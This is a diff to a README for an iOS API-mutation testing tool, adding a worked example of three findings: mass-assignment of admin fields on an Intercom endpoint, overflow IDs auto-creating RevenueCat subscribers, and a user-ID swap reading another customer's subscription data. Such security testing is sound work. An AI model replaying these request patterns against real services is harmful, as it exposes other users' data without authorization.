@@ -168,6 +168,52 @@ Register via `openrecon-install-mcp --agents <your-agent>` or paste into your ag
 - A device manager. Use openrecon's runner / objection for that.
 - A magic vulnerability scanner. Mutations are deterministic — false positives are possible. Use the verdict + evidence as a triage lead, not a guarantee.
 
+## Worked example
+
+A 90-second recording against an authenticated session in a real consumer iOS app, run through the bundled `full` suite, surfaced three classes of finding in under five minutes total wall-clock:
+
+```
+target:    com.example.realapp
+flows:     23
+frida:     68 events
+mutations: 87 executed
+verdicts:
+  leak_detected    4
+  status_change    83
+```
+
+**Finding 1 — `mass_assignment_inject_privileged_fields` on a third-party Intercom endpoint:**
+
+```
+POST https://<intercom-host>/messenger/mobile/users
+body injected: role, is_admin, isAdmin, admin, permission, permissions, user_type, userType, kyc_level, tier
+mutated status: 200
+evidence: email, user_id, session
+response leaked: app's actual admin team — names, avatars, internal IDs
+```
+
+**Finding 2 — `integer_overflow_id` on RevenueCat subscriber endpoint:**
+
+```
+GET https://api.revenuecat.com/v1/subscribers/2147483647
+GET https://api.revenuecat.com/v1/subscribers/9223372036854775807
+mutated status: 201 (auto-created)
+finding: predictable numeric IDs + auto-create on read → trivial user enumeration
+```
+
+**Finding 3 — `swap_user_id` cross-tenant read on the same RevenueCat endpoint:**
+
+```
+baseline: GET /v1/subscribers/83122           (the app's signed-in user)
+mutated:  GET /v1/subscribers/1               (substituted via session_pool.user_b)
+mutated status: 200
+response: another customer's subscription history (first_seen, last_seen, IDs)
+```
+
+All three were SDK-side misconfigurations that ship in many iOS apps using those vendors — not just the recorded target. iorpl surfaced them automatically from one passive recording.
+
+---
+
 ## Roadmap (light)
 
 - Recording **touches** (UIAutomation / XCTest synthesis) so the entire user journey replays, not just HTTP.
